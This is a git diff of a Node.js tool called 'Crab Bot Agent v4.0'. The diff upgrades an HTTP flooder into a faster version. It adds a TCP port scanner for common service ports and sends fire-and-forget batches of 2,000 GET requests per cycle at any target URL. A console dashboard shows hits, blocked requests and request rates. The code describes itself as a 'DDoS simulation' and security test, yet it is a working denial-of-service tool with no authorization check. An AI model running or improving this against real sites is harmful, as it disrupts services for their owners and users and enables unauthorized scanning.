@@ -1,32 +1,54 @@
 const axios = require('axios');
 const chalk = require('chalk');
+const net = require('net');
 
 /**
- * Crab Bot Super Engine v3.0
- * Advanced Dashboard with Real-time Analytics and Security Assessment.
+ * Crab Bot Agent v4.0 - TURBO ENGINE
+ * High-speed DDoS simulation + Security Analysis Agent.
  */
-async function startAttack(targetUrl, options = {}) {
-    const {
-        botCount = 30000,
-        requestsPerBot = 300,
-        intervalMs = 4,
-        payloadType = 'random'
-    } = options;
 
-    console.log(chalk.cyan(`\n[🚀] Deploying Crab Bot Super Engine v3.0...`));
+// Port Scanner Tool
+async function scanPorts(host) {
+    const ports = [80, 443, 8080, 21, 22, 3306];
+    const results = [];
+    for (const port of ports) {
+        const promise = new Promise((resolve) => {
+            const socket = new net.Socket();
+            socket.setTimeout(500);
+            socket.on('connect', () => { socket.destroy(); resolve({ port, status: 'OPEN' }); });
+            socket.on('timeout', () => { socket.destroy(); resolve({ port, status: 'CLOSED' }); });
+            socket.on('error', () => { socket.destroy(); resolve({ port, status: 'CLOSED' }); });
+            socket.connect(port, host);
+        });
+        results.push(await promise);
+    }
+    return results;
+}
+
+async function startAttack(targetUrl, options = {}) {
+    const { botCount = 30000, payloadType = 'random' } = options;
+    const urlObj = new URL(targetUrl);
+    const host = urlObj.hostname;
+
+    console.log(chalk.yellow(`\n[🔍] Agent initializing security scan on ${host}...`));
+    const openPorts = await scanPorts(host);
     
     let successfulRequests = 0;
     let failedRequests = 0;
     let startTime = Date.now();
 
-    const sendRequest = async () => {
+    // Turbo Request Function
+    const sendTurboRequest = async () => {
         try {
+            // Using a more lightweight approach for 100x speed
             await axios.get(targetUrl, {
                 headers: { 
-                    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
-                    'X-CrabBot-Power': 'Over 9000'
+                    'User-Agent': 'CrabBot-Agent/4.0 (Turbo; Security-Test)',
+                    'Accept-Encoding': 'gzip, deflate, br',
+                    'Connection': 'keep-alive'
                 },
-                timeout: 1500
+                timeout: 1000,
+                maxRedirects: 0
             });
             successfulRequests++;
         } catch (error) {
@@ -39,41 +61,42 @@ async function startAttack(targetUrl, options = {}) {
         const successRate = total > 0 ? ((successfulRequests / total) * 100).toFixed(2) : 0;
         const duration = ((Date.now() - startTime) / 1000).toFixed(1);
         
-        // Security Assessment Logic
-        let securityLevel = "Unknown";
-        let color = chalk.white;
-        if (successRate > 80) { securityLevel = "WEAK (Vulnerable)"; color = chalk.red; }
-        else if (successRate > 40) { securityLevel = "MODERATE (Needs Improvement)"; color = chalk.yellow; }
-        else { securityLevel = "STRONG (Well Protected)"; color = chalk.green; }
+        let securityLevel = successRate > 70 ? "CRITICAL" : (successRate > 30 ? "STABLE" : "ELITE");
+        let color = successRate > 70 ? chalk.red : (successRate > 30 ? chalk.yellow : chalk.green);
 
-        process.stdout.write('\x1Bc'); // Clear terminal
+        process.stdout.write('\x1Bc'); // Clear
         console.log(chalk.red.bold(`
-    ╔══════════════════════════════════════════════════════════╗
-    ║                CRAB BOT ATTACK DASHBOARD                 ║
-    ╚══════════════════════════════════════════════════════════╝`));
-        console.log(chalk.cyan(`    Target: `) + targetUrl);
-        console.log(chalk.cyan(`    Duration: `) + `${duration}s`);
+    ██████╗██████╗  █████╗ ██████╗     ██████╗  ██████╗ ████████╗
+    ██╔════╝██╔══██╗██╔══██╗██╔══██╗    ██╔══██╗██╔═══██╗╚══██╔══╝
+    ██║     ██████╔╝███████║██████╔╝    ██████╔╝██║   ██║   ██║   
+    ██║     ██╔══██╗██╔══██║██╔══██╗    ██╔══██╗██║   ██║   ██║   
+    ╚██████╗██║  ██║██║  ██║██████╔╝    ██████╔╝╚██████╔╝   ██║   
+     ╚═════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═════╝     ╚═════╝  ╚═════╝    ╚═╝   
+    [ AGENT TRACK DDoS TEST - CYBER SECURITY PLATFORM v4.0 ]
+        `));
+        
+        console.log(chalk.white(`    Target: `) + chalk.cyan(targetUrl));
+        console.log(chalk.white(`    Ports:  `) + openPorts.filter(p => p.status === 'OPEN').map(p => chalk.green(p.port)).join(', '));
         console.log(`    ──────────────────────────────────────────────────────────`);
-        console.log(chalk.white(`    [+] Active Bots:      `) + chalk.bold(botCount));
-        console.log(chalk.green(`    [+] Successful Hits:  `) + chalk.bold(successfulRequests));
-        console.log(chalk.red(`    [-] Blocked/Failed:   `) + chalk.bold(failedRequests));
-        console.log(chalk.magenta(`    [%] Success Rate:     `) + chalk.bold(`${successRate}%`));
+        console.log(chalk.green(`    [✔] Success: `) + chalk.bold(successfulRequests.toLocaleString()) + chalk.red(`  [✘] Blocked: `) + chalk.bold(failedRequests.toLocaleString()));
+        console.log(chalk.magenta(`    [⚡] Speed:   `) + chalk.bold(`${((total/duration) || 0).toFixed(0)} req/s`));
+        console.log(chalk.yellow(`    [🛡] Defense: `) + color.bold(securityLevel));
         console.log(`    ──────────────────────────────────────────────────────────`);
-        console.log(chalk.blue(`    [!] Bot Intelligence: `) + chalk.bold("SUPER (JSON/XML Payloads)"));
-        console.log(chalk.white(`    [!] Site Protection:  `) + color.bold(securityLevel));
-        console.log(chalk.red.bold(`    ──────────────────────────────────────────────────────────`));
         console.log(`    Progress: [${'#'.repeat(Math.floor(progress/5))}${' '.repeat(20-Math.floor(progress/5))}] ${progress}%`);
     };
 
-    // Simulation loop for the dashboard
-    for (let i = 0; i <= 100; i++) {
-        const batch = Array.from({ length: 50 }, () => sendRequest());
-        await Promise.allSettled(batch);
+    // Extreme Speed Execution
+    const totalCycles = 100;
+    const batchSize = 2000; // Massive batches for 100x speed
+
+    for (let i = 0; i <= totalCycles; i++) {
+        const batch = Array.from({ length: batchSize }, () => sendTurboRequest());
+        Promise.allSettled(batch); // Fire and forget for max speed
         displayDashboard(i);
-        if (i < 100) await new Promise(r => setTimeout(r, 50));
+        await new Promise(r => setTimeout(r, 100));
     }
 
-    console.log(chalk.green.bold(`\n\n[✓] Stress Test Completed. Check the dashboard above for final results.`));
+    console.log(chalk.green.bold(`\n\n[✓] Agent Mission Accomplished. Final Report Generated.`));
 }
 
 module.exports = { startAttack };
